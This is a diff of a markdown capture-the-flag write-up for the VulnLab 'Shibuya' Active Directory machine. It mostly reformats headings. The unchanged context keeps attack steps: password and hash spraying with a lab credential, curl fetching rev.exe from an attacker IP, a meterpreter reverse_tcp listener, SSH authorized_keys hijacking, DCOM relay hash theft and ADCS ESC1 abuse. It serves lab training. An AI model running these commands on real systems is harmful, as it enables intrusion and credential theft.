@@ -12,7 +12,7 @@ draft: false
 
 Today we're doing Shibuya, a VulnLab **Hard** Machine meant will teach you *Kerberos Password Spraying*, *LDAP Enumeration*, *SMB Shares enumeration*, *cracking images & extracting crucial windows database files,* Hash spraying over kerberos, *hijacking FTP authorized keys*, port forwarding, *Cross-Session DCOM Relay* in order to exploit an active session on the **DC**, and finally *exploiting ADCs (ESC1)*&#x20;
 
-## Reconnaissance
+# Reconnaissance
 
 Let's start by checking what **TCP Ports** are accessible
 
@@ -64,7 +64,7 @@ And quickly, some users appear&#x20;
 
 <figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FVjncABWNLfK9k8rDsZX5%2Fimage.png?alt=media&#x26;token=d8305ae8-7408-4182-aa4c-ee0ee0819ec7" alt=""><figcaption></figcaption></figure>
 
-Let's export these users into a `users.txt` file, don't forget to add a blank line on the file so in further fuzzing it also tries with NULL passwords and usernames
+Let's export these users into a `users.txt` file, don't forget to add a blank line on the file so in further fuzzing it also tries with **NULL passwords and usernames**
 
 Now let's try to recon the `TCP 445 (SMB)` port using `netexec` with the use of a **NULL Session** in order to list more shares, users, groups, etc...
 
@@ -76,9 +76,9 @@ nxc smb -u '' -p ''
 
 But it seems that the service is not accepting **NULL sessions** as an option
 
-So let's try to use their names as their password as this is the first natural step when finding valid domain users, we'll use `netexec` for this
+# Password Spraying
 
-## Password Spraying
+So let's try to use their names as their password as this is the first natural step when finding valid domain users, we'll use `netexec` for this
 
 ```bash
 nxc smb shibuya.vl -u users.txt -p users.txt --continue-on-success -k
@@ -123,7 +123,7 @@ nxc smb shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' -k --shares
 
 we have access to two non-regular shares: `users` and `images$` but we will enumerate all of them with the use of the spider\_plus module inside of `netexec` what this module does is that it **Spiders Shares** enumerating all files and content on it on a more fast and automatic way
 
-```
+``` bash
 nxc smb shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' -k -M spider_plus
 ```
 
@@ -152,11 +152,12 @@ nxc smb shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' -k --share images$ --
 
 <figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2Fzd4f14LRqL4N6sRKzOo4%2Fimage.png?alt=media&#x26;token=7d9dd70e-858b-4b24-98d3-a46813a99cb2" alt=""><figcaption></figcaption></figure>
 
-We'll use the Thunar file manager to inspect what's inside these compressed files
 
-<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F7hoEyD6MdSWdrBIR99uL%2Fimage.png?alt=media&#x26;token=ec88a71a-8702-48bb-8bf6-f5a1039b9a58" alt=""><figcaption></figcaption></figure>
+# Dumping hashes locally
 
-## Dumping hashes locally
+We'll use the `Thunar File Manager` to inspect what's inside these compressed files
+
+<figure><img src="https://delorian.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F3550432212-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FgxTXO9Ixrx4ExK6jnMbc%252Fuploads%252F7hoEyD6MdSWdrBIR99uL%252Fimage.png%3Falt%3Dmedia%26token%3Dec88a71a-8702-48bb-8bf6-f5a1039b9a58&width=768&dpr=1&quality=100&sign=d6e2f034&sv=2"> <figcaption></figcaption></figure>
 
 The file that stands out most is `AWSJPWK0222-02.wim` as it contains the `SAM` file as well as the `SYSTEM` file, we can dump existent **hashes** on this using `impacket-secretsdump` , you need to also do the labour to inspect all of these files in order to see if there's something more important, but in this case I'll tell you beforehand that no
 
@@ -181,7 +182,7 @@ operator       -  5d8c3d1a20bd63f60f469f6763ca0d50
 
 Also there's the Administrator hash, but, this time it wont work (Yeah, I've tried it)
 
-## Hash Spraying
+# Hash Spraying
 
 We can try to perform a `Hash Spraying Attack` with these *hashes,* starting off with the non-default account: **operator's** hash&#x20;
 
@@ -203,7 +204,7 @@ Crawling a bit throughout the shares, we see that we can already retrieve the us
 
 <figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FC8auQ8hcTdTEPa9X5kF9%2Fimage.png?alt=media&#x26;token=ca9b0457-bdd6-4076-ad7e-cc9c130ff6d5" alt=""><figcaption></figcaption></figure>
 
-## Hijacking SSH authorized\_keys
+# Hijacking SSH authorized\_keys
 
 Remember we had access to `SSH` on the **DC**? we can hijack this user's authorized\_keys in order to access on the system using **SSH**&#x20;
 
@@ -233,7 +234,7 @@ ssh -i simon simon.watson@shibuya.vl
 
 <figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FHhy8Iatsipw6yw7SMqk1%2Fimage.png?alt=media&#x26;token=ac10dcc2-9e58-49c7-bf88-91ff50f93d7f" alt=""><figcaption></figcaption></figure>
 
-## BloodHound enumeration
+# BloodHound enumeration
 
 We're in! (finally) now let's try to recollect information onto our bloodhound using the SharpHound.exe collector, but first let's settle up our `Bloodhound-Ce`&#x20;
 
@@ -266,7 +267,7 @@ curl http://10.10.14.96/rev.exe -o C:\Users\simon.watson\Desktop\rev.exe
 
 Now set up our listener in `msf` and configure it
 
-```
+``` bash
 use multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST tun0
@@ -308,7 +309,7 @@ We can also see he's part of a group called `T1_ADMINS`&#x20;
 
 Why is this important? Because there's a vulnerability called **Cross-Session DCOM Relay Attack** which we will see now
 
-## Cross-Session DCOM Relay Attack
+# Cross-Session DCOM Relay Attack
 
 The presence of Nigel.Mills in the T1\_ADMINS group creates a prime exploitation scenario. As a **Tier 1 administrator**, this user possesses elevated *domain privileges*, making their session an ideal target for credential theft.
 
@@ -341,7 +342,7 @@ And in the victim machine we'll use the exploit pointing to our `tun0` **IP** on
 
 <figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FiUMQFxopFW6RGzejulFE%2Fimage.png?alt=media&#x26;token=c344e5bb-84cc-41df-935c-7a022713031c" alt=""><figcaption></figcaption></figure>
 
-## Cracking Nigel's hash
+# Cracking Nigel's hash
 
 And there we have our stolen `NTLMv2` hash, let's crack it using  `john`&#x20;
 
@@ -354,7 +355,7 @@ john -w=/usr/share/seclists/rockyou.txt hash.txt
 
 And the cracked password it's `Sail2Boat3`&#x20;
 
-## Exploiting Vulnerable ADCs
+# Exploiting Vulnerable ADCs
 
 Now we see Nigel's outbound objects on `BloodHound`&#x20;
 
